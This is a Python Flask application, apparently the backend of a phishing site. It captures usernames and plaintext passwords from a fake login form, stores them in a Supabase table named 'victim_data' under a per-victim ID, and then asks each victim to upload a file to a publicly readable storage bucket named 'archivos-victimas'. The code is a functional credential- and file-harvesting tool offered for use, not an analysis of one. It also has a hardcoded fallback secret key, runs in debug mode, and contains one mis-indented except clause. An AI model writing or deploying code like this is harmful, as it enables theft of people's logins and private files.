import os
import datetime
import uuid
import json

from flask import Flask, render_template, request, redirect, url_for, session
from supabase import create_client, PostgrestAPIError
# Importamos la librería para manejar la subida de archivos
from supabase.lib.storage_client import StorageException 

# --- CONFIGURACIÓN DE LA APLICACIÓN Y SUPABASE ---

# Configuración de Flask
app = Flask(__name__)
# ¡IMPORTANTE! Genera una clave secreta fuerte para la sesión
app.config['SECRET_KEY'] = os.environ.get('FLASK_SECRET_KEY', 'default_secret_key_very_insecure') 
app.config['SUPABASE_URL'] = os.environ.get('SUPABASE_URL')
app.config['SUPABASE_KEY'] = os.environ.get('SUPABASE_ANON_KEY')

# Inicialización de Supabase
try:
    if not app.config['SUPABASE_URL'] or not app.config['SUPABASE_KEY']:
        raise ValueError("Las variables de entorno SUPABASE_URL y SUPABASE_ANON_KEY son obligatorias.")
    
    supabase = create_client(app.config['SUPABASE_URL'], app.config['SUPABASE_KEY'])
    print("Conexión con Supabase establecida.")

except ValueError as e:
    print(f"Error de configuración: {e}")
except PostgrestAPIError as e:
    print(f"Error de conexión a Supabase: {e}")
    supabase = None
except Exception as e:
    print(f"Error inesperado durante la inicialización de Supabase: {e}")
    supabase = None


# Nombre de la tabla de la base de datos y el bucket de almacenamiento
DB_TABLE = "victim_data"
STORAGE_BUCKET = "archivos-victimas" 

# --- RUTAS Y VISTAS ---

@app.route('/')
def index():
    """Muestra la página de inicio de sesión."""
    return render_template('index.html')

@app.route('/process_login', methods=['POST'])
def process_login():
    """
    Procesa el formulario de inicio de sesión, inserta los datos en Supabase 
    y redirige a la página de carga de archivos.
    """
    if not supabase:
        return error_page("Error de aplicación", "El servicio de base de datos no está disponible.")

    username = request.form.get('username')
    password = request.form.get('password')
    
    # 1. Generar un ID único para la víctima/sesión
    victim_id = str(uuid.uuid4())
    session['victim_id'] = victim_id # Guarda el ID en la sesión para usarlo después
    
    # 2. Generar la marca de tiempo en formato ISO 8601 para PostgreSQL (timestampz)
    # Esto corrige el error de "value out of range"
    current_timestamp_iso = datetime.datetime.now(datetime.timezone.utc).isoformat()
    
    # 3. Intentar insertar los datos en la base de datos
    try:
        data_to_insert = {
            "username": username,
            "password": password,
            "victim_id": victim_id,
            "timestamp": current_timestamp_iso,
            "file_name": "N/A - Archivo aún no subido",
            "file_url": "N/A - Archivo aún no subido",
            # Inicializamos el campo 'file_data' como NULL o vacío. Supabase lo maneja como NULL.
            "file_data": None 
        }
        
        # Insertar los datos en la tabla
        response = supabase.table(DB_TABLE).insert(data_to_insert).execute()
        
        # Verificar si la inserción fue exitosa
        if response.data:
            print(f"Datos de login insertados con ID de víctima: {victim_id}")
            return redirect(url_for('upload_file'))
        else:
            # Si response.data está vacío pero no hubo excepción, puede ser un problema de RLS
            return error_page("Error de Base de Datos", "No se pudo insertar el registro. Verifica las políticas RLS.")
   except PostgrestAPIError as e:
        # Intenta parsear el error para mostrar detalles
        try:
            error_data = json.loads(e.message)
            return error_page("Error de base de datos o interno.", f"Detalle Técnico: {error_data}")
        except:
            return error_page("Error de Base de Datos", f"Ocurrió un error al insertar los datos: {e.message}")
    except Exception as e:
        return error_page("Error Desconocido", f"Ha ocurrido un error inesperado: {str(e)}")


@app.route('/upload_file', methods=['GET', 'POST'])
def upload_file():
    """
    Muestra la página de carga de archivos (GET) o procesa el archivo subido (POST).
    """
    # Se asegura de que haya un ID de víctima en la sesión
    victim_id = session.get('victim_id')
    if not victim_id:
        return redirect(url_for('index'))

    if request.method == 'POST':
        # 1. Obtener el archivo del formulario
        if 'file' not in request.files:
            return error_page("Error de Carga", "No se encontró el archivo en la solicitud.")
        
        file = request.files['file']
        
        if file.filename == '':
            return error_page("Error de Carga", "No se seleccionó ningún archivo.")

        if file:
            original_filename = file.filename
            
            # 2. Generar un nombre de archivo único para Supabase Storage
            # Usamos el victim_id para prefijar el nombre y garantizar unicidad
            unique_file_name = f"{victim_id}-{original_filename}"
            
            # 3. Subir el archivo a Supabase Storage
            try:
                # La función upload requiere que leas el contenido del archivo antes de subirlo
                file_data = file.read() 
                
                # Subir el archivo
                storage_response = supabase.storage.from_(STORAGE_BUCKET).upload(
                    file=file_data,
                    path=unique_file_name,
                    file_options={"content-type": file.content_type}
                )
                
                # 4. Obtener la URL pública del archivo
                public_url_response = supabase.storage.from_(STORAGE_BUCKET).get_public_url(unique_file_name)
                public_file_url = public_url_response
                
                # 5. Actualizar el registro en la base de datos con los detalles del archivo
                update_data = {
                    "file_name": original_filename,
                    "file_url": public_file_url,
                    # El campo 'file_data' puede permanecer en NULL/None ya que el archivo está en Storage
                }
                
                update_response = supabase.table(DB_TABLE).update(update_data).eq("victim_id", victim_id).execute()
                
                if update_response.data:
                    return render_template('thank_you.html', filename=original_filename, victim_id=victim_id)
                else:
                    return error_page("Error de Base de Datos", "El archivo se subió, pero no se pudo actualizar el registro.")
                    
            except PostgrestAPIError as e:
                 return error_page("Error de Base de Datos", f"Error al actualizar el registro: {e.message}")
            except StorageException as e:
                return error_page("Error de Almacenamiento", f"Error al subir el archivo: {e}")
            except Exception as e:
                return error_page("Error Desconocido", f"Ha ocurrido un error inesperado durante la carga: {str(e)}")

    # Si es GET, muestra el formulario de carga
    return render_template('upload_file.html', victim_id=victim_id)


@app.route('/thank_you')
def thank_you():
    """Muestra la página de confirmación (sólo debería ser alcanzada por redirect)."""
    # Si alguien navega directamente aquí, redirigimos al inicio
    if 'victim_id' not in session:
        return redirect(url_for('index'))
    
    # Renderizamos la plantilla de agradecimiento (los datos serán inyectados por el POST)
    return render_template('thank_you.html', filename="desconocido", victim_id=session['victim_id'])

# Manejador de errores personalizado
def error_page(title, message):
    """Muestra una página de error con un mensaje detallado."""
    return render_template('error.html', error_title=title, error_message=message), 500

# --- EJECUCIÓN DEL SERVIDOR ---

# Usamos if __name__ == '__main__': para ejecutar el servidor localmente (no en Render)
if __name__ == '__main__':
    # Usar el puerto 8080 para desarrollo local, si está disponible
    port = int(os.environ.get('PORT', 8080))
    app.run(debug=True, host='0.0.0.0', port=port)
